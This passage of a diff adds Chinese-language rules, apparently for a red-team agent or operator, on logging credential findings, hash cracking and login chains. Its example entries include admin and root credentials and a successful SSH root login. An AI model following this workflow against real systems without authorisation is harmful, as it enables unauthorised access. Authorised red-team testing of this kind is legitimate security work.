+   `evidence` 写「资产｜后台管理员 tomcat/Tomcat@2024」）。
+   **登不进去就在 `redteam_asset_test` 的 `test` 里记一行卡点**（哈希未破解/需二次认证/限制来源 IP/账号已禁用），不记分。
+3. **账号权限按服务封顶**：同一资产同一端口只算一次分，拿到管理员即该服务拿满——不要在同一服务上刷多个账号。
+4. 每个关键动作 `redteam_chain_add`：`stage_code=internet`（或 `internal`），
+   `tool` 写实际命令、`result` 写回显摘要（如 `ssh 10.0.0.5 用 root/Root@123 登录成功，uid=0(root)`）。
+5. 哈希文件、破解结果一律放 `runs/`。
